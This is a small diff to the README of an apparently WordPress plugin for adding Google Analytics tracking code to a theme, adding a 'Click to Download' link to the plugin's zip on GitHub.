@@ -5,6 +5,8 @@
 <p>This plugin provide you easiest way to integrate Google Analytics into the header or footer of your theme.</p>
 <p>All you have to do is put the code in the plugin.</p>
 
+<a href="https://github.com/Wordpress-Plugins-World/kirilkirkov-google-analytics/blob/master/Includes/Assets/kirilkirkov-google-analytics.zip?raw=true" download>Click to Download</a>
+
 ## Features
 
 - Tracking code
